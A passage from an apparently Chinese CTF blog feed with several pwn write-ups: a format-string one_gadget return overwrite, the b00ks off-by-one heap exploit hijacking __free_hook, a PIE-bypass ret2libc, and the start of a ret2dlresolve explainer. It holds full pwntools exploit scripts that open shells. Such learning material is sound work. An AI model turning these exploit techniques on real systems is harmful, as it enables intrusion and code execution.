位后面以达到完整地址的偏移量。</p></li><li><p><strong>格式化字符串参数：</strong> 在格式字符串攻击中，<code>%hn</code> 写入 16 位的数值到一个指定的内存地址。因此，你需要两个写操作：</p><ul><li>第一次写操作用 <code>num1</code>（低 16 位）。</li><li>第二次写操作则将 <code>num2</code> 写入到目标地址的高 16 位。</li></ul></li><li><p><strong>执行顺序：</strong> 在这种方式控制内存写入时，确保正确顺序非常重要，因为低 16 位和高 16 位分别会被修改，因此需要正确的偏移才能将 <code>system</code> 的完整地址写入目标位置。</p></li></ol><p>总结起来，<code>num2</code> 的计算是通过右移和减去 <code>num1</code> 获取的为了将 <code>system</code> 地址的高 16 位正确写入目的地。这种技术是利用格式字符串漏洞进行精准内存操作的重要手段。</p><p>注意：这里因为是在play函数里面改的，系统已经会按照代码继续执行，所以改掉返回地址也没有关系，不要误认为是通过printf_got+2来执行的</p><h4 id="方法二：修改返回地址为oneget来getshell"><a href="#方法二：修改返回地址为oneget来getshell" class="headerlink" title="方法二：修改返回地址为oneget来getshell"></a>方法二：修改返回地址为oneget来getshell</h4><p>先放exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#io=process(&#x27;./playfmt&#x27;)</span><br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-string">&#x27;27461&#x27;</span>)<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">a</span>):<br>io.send(a)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;=====================\n&quot;</span>)<br>io.recvuntil(<span class="hljs-string">&quot;=====================\n&quot;</span>) <span class="hljs-comment">#6 rbp 9 GOT 10 6-&gt;10</span><br>payload = <span class="hljs-string">&quot;%6$p\n%15$p&quot;</span><br>io.sendline(payload)<br>rbp = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>).strip(), <span class="hljs-number">16</span>) <span class="hljs-comment">#泄露栈地址</span><br>success(<span class="hljs-string">&quot;rbp:&quot;</span>+<span class="hljs-built_in">hex</span>(rbp))<br>start_main = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>).strip(), <span class="hljs-number">16</span>) - <span class="hljs-number">247</span> <span class="hljs-comment">#泄露libc地址</span><br>libc.address = start_main - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>system = libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>success(<span class="hljs-string">&quot;libc:&quot;</span>+<span class="hljs-built_in">hex</span>(libc.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br>one=p32(libc.address+<span class="hljs-number">0x3a80c</span>)<br>ret=rbp-<span class="hljs-number">8</span>-<span class="hljs-number">4</span><br>num=(rbp-<span class="hljs-number">12</span>)&amp;<span class="hljs-number">0xff</span><br>payload=<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(num)+<span class="hljs-string">&quot;c%6$hhn\0&quot;</span><br>fmt(payload)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>raw_input()<br>payload=<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(num+i)+<span class="hljs-string">&quot;c%6$hhn\0&quot;</span><br>fmt(payload)<br>raw_input()<br>payload=<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(one[i])+<span class="hljs-string">&quot;c%10$hhn\0&quot;</span><br>fmt(payload)<br>fmt(<span class="hljs-string">&#x27;quit&#x27;</span>)<br>io.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><p>gdb调试可以看到返回地址是play函数</p><p><img src="/img/fmt_bss/h.png" alt="img"></p><p>如果我们能把它改成onegadget，我们就能getshell</p><p><img src="/img/fmt_bss/i.png" alt="img"></p><p>可以看到已经更改</p><p>onegadget用工具在libc文件寻找</p>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆溢出_off_by_one</title>
      <link href="/2024/08/20/%E5%A0%86%E6%BA%A2%E5%87%BA-off-by-one/"/>
      <url>/2024/08/20/%E5%A0%86%E6%BA%A2%E5%87%BA-off-by-one/</url>
      
        <content type="html"><![CDATA[<h1 id="堆溢出-off-by-one"><a href="#堆溢出-off-by-one" class="headerlink" title="堆溢出_off_by_one"></a>堆溢出_off_by_one</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>顾名思义就是只溢出一个字节，溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据，或者用NULL字节进行覆盖，从而造成数据泄露，或者块结构数据的控制</p><p>接下来用一道经典的off-by-one的题目来详细解释</p><h1 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="[Asis CTF 2016] b00ks"></a>[Asis CTF 2016] b00ks</h1><p><img src="/img/off-by-one/a.png" alt="img"></p><p>这个程序有5个模块</p><p>而在change模块中存在\x00的溢出</p><p><img src="/img/off-by-one/b.png" alt="img"></p><p>而change模块的数据是存在unk_202040</p><p><img src="/img/off-by-one/c.png" alt="img"></p><p>creatbook时malloc映射的地址时存在unk_202060</p><p><img src="/img/off-by-one/d.png" alt="img"></p><p><img src="/img/off-by-one/e.png" alt="img"></p><p>二者的偏移刚好是0x20,那么我们就可以\x00的溢出，把\x00覆盖掉来泄露出book的地址</p><p><img src="/img/off-by-one/f.png" alt="img"></p><p><img src="/img/off-by-one/g.png" alt="img"></p><p>可以看到创建book1的地址已经把\x00覆盖，打印author的时候就可以把book1泄露出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1f</span>+<span class="hljs-string">&#x27;b&#x27;</span>)<br>creatbook(<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br>printf()<br>p.recvuntil(<span class="hljs-string">&#x27;aaab&#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;heap_addr--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_addr))<br></code></pre></td></tr></table></figure><p>接下来是想办法getshell</p><p>知识点：一个chunk&gt;144被free时会被放到unsorted bin 中，unsorted bin 的bk指针时glibc里面的，如果我们能够泄露，那么就可以得到基址，最后劫持__free_hook函数即可。</p><p>book1的指针和book1_des的指针地址实际上只有最后两位不同，我们只要控制号book1的大小，就能让book1_des的后两位为\x00,这样在堆溢出一次把book1的指针后两位覆盖，这样book1就指向了book1_des,而des是可编辑的，给我们伪造book1，即fake_book1创造了条件。</p><p>首先再创建一个book2再free得到unsorted bin</p><p><img src="/img/off-by-one/h.png" alt="img"></p><p><img src="/img/off-by-one/i.png" alt="img"></p><p>可以看到heap_addr到bk指针的偏移就是0x20+0x10</p><p>这里还要creat book3来劫持__free_hook,首先把fake_book1_des指针指向book3_des的指针,这样后面就可以通过edit模块，把book3_des修改为__free_hook,在把__free_hook的内容改为system,达到劫持的目的</p><p>那么我们fake_book1的伪造为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">creatbook(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;dddddddd&#x27;</span>)<br>creatbook(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)  <span class="hljs-comment">#创造book3，为劫持__free_hook</span><br>delete(<span class="hljs-number">2</span>)       <span class="hljs-comment">#创造unsorted bin</span><br> <br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">1</span>)+p64(heap_addr+<span class="hljs-number">0x30</span>)+p64(heap_addr+<span class="hljs-number">0x180</span>+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x20</span>)) <br><span class="hljs-comment">#伪造book1,即fake_book1,</span><br><span class="hljs-comment">#将fake_book1_name指向bk指针</span><br><span class="hljs-comment">#将fake_book1_des指向book3的des</span><br>change(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)  <span class="hljs-comment">#把book1的指针改为fake_book1</span><br>printf() <span class="hljs-comment">#leak</span><br></code></pre></td></tr></table></figure><p>泄露出来的bk指针 </p><p><img src="/img/off-by-one/j.png" alt="img"></p><p>查询这个指针上下200</p><p><img src="/img/off-by-one/k.png" alt="img"></p><p><img src="/img/off-by-one/l.png" alt="img"></p><p>发现__memalign_hook和__malloc_hook，这两个都是glibc里面的，这里选择__malloc_hook,偏移为0x68,即可泄露libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>libc_base+=-<span class="hljs-number">0x68</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>__free_hook=libc_base+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>edit(<span class="hljs-number">1</span>,p64(__free_hook)+p64(<span class="hljs-number">0x10</span>)) <span class="hljs-comment">#把book3的des指针改为__free_hook</span><br></code></pre></td></tr></table></figure><p> 最后再把book3_des改为system，输入&#x2F;bin&#x2F;sh来getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">3</span>,p64(system))<br>delete(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/off-by-one/m.png" alt="img"></p><p>最终exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = remote(&#x27;node5.buuoj.cn&#x27;,&#x27;29085&#x27;)</span><br>p=process(<span class="hljs-string">&#x27;./b00ks&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./b00ks&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">creatbook</span>(<span class="hljs-params">name_size,name,content_size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(name_size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;chars): &#x27;</span>,name)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size: &#x27;</span>,<span class="hljs-built_in">str</span>(content_size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;tion: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;delete: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;edit: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;ption: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>():<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">author_name</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,author_name)<br> <br>p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1f</span>+<span class="hljs-string">&#x27;b&#x27;</span>)<br>creatbook(<span class="hljs-number">0xd0</span>,<span class="hljs-string">&#x27;aaaaaaaa&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;bbbbbbbb&#x27;</span>)<br>printf()<br>p.recvuntil(<span class="hljs-string">&#x27;aaab&#x27;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;heap_addr--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(heap_addr))<br>creatbook(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;cccccccc&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;dddddddd&#x27;</span>)<br>creatbook(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>delete(<span class="hljs-number">2</span>)<br> <br>edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">1</span>)+p64(heap_addr+<span class="hljs-number">0x30</span>)+p64(heap_addr+<span class="hljs-number">0x180</span>+<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0x20</span>))<br>change(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>printf()<br> <br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>libc_base+=-<span class="hljs-number">0x68</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>__free_hook=libc_base+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br> <br>edit(<span class="hljs-number">1</span>,p64(__free_hook)+p64(<span class="hljs-number">0x10</span>))<br> <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;__free_hook--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(__free_hook))<br> <br>edit(<span class="hljs-number">3</span>,p64(system))<br>delete(<span class="hljs-number">3</span>)<br>p.interactive()<br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure><p>作者理解的第一道堆题，纪念一下</p><p><a href="https://www.uf4te.cn/posts/18c02ebd.html">【Asis CTF 2016】b00ks</a></p><p>[<a href="https://blog.csdn.net/Tokameine/article/details/120256944">Asis CTF 2016] b00ks —— Off-By-One笔记与思考</a></p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xyctf_hello_world之%s泄露libc</title>
      <link href="/2024/06/01/xyctf-hello-world%E4%B9%8B-s%E6%B3%84%E9%9C%B2libc/"/>
      <url>/2024/06/01/xyctf-hello-world%E4%B9%8B-s%E6%B3%84%E9%9C%B2libc/</url>
      
        <content type="html"><![CDATA[<h1 id="xyctf-hello-world之-s泄露libc"><a href="#xyctf-hello-world之-s泄露libc" class="headerlink" title="xyctf_hello_world之%s泄露libc"></a>xyctf_hello_world之%s泄露libc</h1><p>前置知识</p><h1 id="PIE机制介绍"><a href="#PIE机制介绍" class="headerlink" title="PIE机制介绍"></a>PIE机制介绍</h1><p><strong>PIE</strong> PIE技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载基地址，从而不能通过ROPgadget等一些工具来帮助解题</p><h6 id="vmmap-的使用"><a href="#vmmap-的使用" class="headerlink" title="vmmap 的使用"></a>vmmap 的使用</h6><p>gdb 调试中，vmmap 可以直接看出本地的静态基地址，在栈上可以看到静态真实地址</p><p>上题(本地）</p><p>基础检查</p><p><img src="/img/xyctf/a.png" alt="img"></p><p>发现是64位文件，开了pie保护和NX保护</p><p>丢入ida</p><p><img src="/img/xyctf/b.png" alt="img"></p><p>很正常 没有什么漏洞</p><p>找一下系统函数</p><p><img src="/img/xyctf/c.png" alt="img"></p><p>没有找到，判断应该是要泄露libc </p><p>但是因为开了pie 保护，加载基地址随机化，不能像ret2libc 一样用write函数，puts函数，printf函数等泄露出来</p><p>没有思路 用gdb 调试看看</p><p><img src="/img/xyctf/d.png" alt="img"></p><p>发现了真实地址，那么我们可以泄露他的真实地址来算出他的基址</p><p>（真实地址&#x3D;加载地址+偏移地址）</p><p>因为read 函数有字节限制，我们要泄露的地址只能是0x48以内的</p><p>有dl_mian和__libc_start_call_main 两个，我选择了第二个</p><p>算一下偏移</p><p><img src="/img/xyctf/e.png" alt="img"></p><p>接下来我们要计算他的偏移地址(偏移地址&#x3D;静态真实地址-静态加载地址）</p><p>他的静态真实地址为<img src="/img/xyctf/f.png" alt="img"></p><p>静态基础地址可用vmmap 查看</p><p><img src="/img/xyctf/g.png" alt="img"></p><p>可计算出偏移为0x276ca(本地和远程不一样)</p><p>使用payload1 的构造和libc_base 的计算为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span><br>io.recvuntil(<span class="hljs-string">&quot;please input your name: &quot;</span>)<br>io.send(payload)<br>addr=u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr))<br>base=addr-<span class="hljs-number">0x276ca</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(base))<br></code></pre></td></tr></table></figure><p>这道题还要注意的是，它的ROP链也要用libc里的</p><p>由于是打本地</p><p>ldd 查看本地libc 路径</p><p><img src="/img/xyctf/h.png" alt="img"></p><p>用ROPgadget找到ret和rdi 的偏移</p><p>同时把&#x2F;bin&#x2F;sh 也找出来</p><p><img src="/img/xyctf/i.png" alt="img"></p><p><img src="/img/xyctf/j.png" alt="img"></p><p>ret 和rdi，binsh的构造为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">ret=<span class="hljs-number">0x275f2</span>+base<br>rdi=<span class="hljs-number">0x27c65</span>+base<br>binsh=<span class="hljs-number">0x19604f</span>+base<br></code></pre></td></tr></table></figure><p>最后进行一次栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">40</span>+p64(ret)+p64(rdi)+p64(binsh)+p64(base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br></code></pre></td></tr></table></figure><p>运行得到shell</p><p><img src="/img/xyctf/k.png" alt="img"></p><p>最终exp</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-attribute">io</span>=process(&#x27;./vuln&#x27;)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./vuln&#x27;)<br><span class="hljs-attribute">libc</span>=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br><span class="hljs-attribute">system</span>=libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><span class="hljs-built_in">print</span>(system)<br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*40<br>io.recvuntil(<span class="hljs-string">&quot;please input your name: &quot;</span>)<br>io.send(payload)<br><span class="hljs-attribute">addr</span>=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(hex(addr))<br><span class="hljs-attribute">base</span>=addr-0x276ca<br><span class="hljs-built_in">print</span>(hex(base))<br><span class="hljs-attribute">ret</span>=0x275f2+base<br><span class="hljs-attribute">rdi</span>=0x27c65+base<br><span class="hljs-attribute">binsh</span>=0x19604f+base<br><span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*40+p64(ret)+p64(rdi)+p64(binsh)+p64(base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>io.send(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 栈利用 </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP之ret2alsolve</title>
      <link href="/2024/04/23/ROP%E4%B9%8Bret2alsolve/"/>
      <url>/2024/04/23/ROP%E4%B9%8Bret2alsolve/</url>
      
        <content type="html"><![CDATA[<h1 id="ROP之ret2alsolve"><a href="#ROP之ret2alsolve" class="headerlink" title="ROP之ret2alsolve"></a>ROP之ret2alsolve</h1><h3 id="RELRO保护原理"><a href="#RELRO保护原理" class="headerlink" title="RELRO保护原理"></a><strong>RELRO保护原理</strong></h3><p>简介<br> 由于 GOT和PLT以及延迟绑定的原因，在启用延迟绑定时，符号解析只发生在第一次使用的时候，该过程是通过PLT表进行的，解析完成后，相应的GOT条目会被修改为正确的函数地址。因此，在延迟绑定的情况下。.got.plt必须可写，这就给了攻击者篡改地址劫持程序的执行的可能。</p><p>RELRO（ReLocation Read-Only）机制的提出就是为了解决延迟绑定的安全问题，它最初于2004年由Redhat的工程师Jakub jelnek实现，他将符号重定位表设置为只读，或者在程序启动时就解析并绑定所有的动态符号，从而避免GOT上的地址被篡改。RELRO有两种形式：</p><p>partial PELRO：一些段（包括.dynamic,.got等）在初始化后会被标记为读。               </p><p>Full RELRO ：除了Partial RELRO，延迟绑定将被禁止，所有的导入符号将在开始时被解析，.got.plt段会被完全初始化为目标函数的最终地址，并被mprotect标记为只读，但其实.got.plt会被直接合并到.got，也就看不到这段了。另外link_map和_dl_runtime_reolve的地址也不会被装入。开启Full RELRO会对程序启动时的性能造成一定的影响，但也只有这样才能防止攻击者篡改GOT。</p><h3 id="延迟绑定技术"><a href="#延迟绑定技术" class="headerlink" title="延迟绑定技术"></a><strong>延迟绑定技术</strong></h3><p>在程序没有开启FULL RELRO的时候，程序第一次执行函数时会进行一次动态链接，将got表上函数地址重定位为libc上的函数地址，这个过程会通过_dl_runtime_resolve(link_map_obj, realoc_index)来实现</p><p><img src="/img/ret2alsolve/a.png" alt="img"></p><p>如图所示</p><p>这里有push eax，eax又是什么呢，是把ebp-0x18的值，而ebp-0x18实际上就是esp,而esp为0x10</p><p>所以这里实际上是push 0x10</p><p>然后继续步入就到了0x8049020</p><p><img src="/img/ret2alsolve/b.png" alt="img"></p><p><img src="/img/ret2alsolve/c.png" alt="img"></p><p>就是PLT0的位置</p><p>而这个push 0x10(是什么后面会讲)由plt表提供,如图所示</p><p><img src="/img/ret2alsolve/d.png" alt="img"></p><p>这里压入了一个参数</p><p><img src="/img/ret2alsolve/e.png" alt="img"></p><p>实际上就是link_map_obj，然后开始执行_dl_runtime_resolve(link_map_obj,realoc_index)将libc地址写入got表，整个延迟绑定大概就是这样</p><p>其中 link_map_obj 参数的作用是为了能够定位 .dynamic 段，而定位了 .dynamic 段就能接着定位(根据偏移）到 .dynstr 段、.dynsym 段、.rel.plt 段，该参数是 PLT0 默认提供的，程序中所有函数在动态链接过程中的该参数都是相同的；</p><p>而realoc_index对应的其实就是类似与前面read函数要push 0x10,这个参数的作用是为了找到函数对应的ELF_REL结构体,这个参数由plt表提供</p><p><img src="/img/ret2alsolve/f.png" 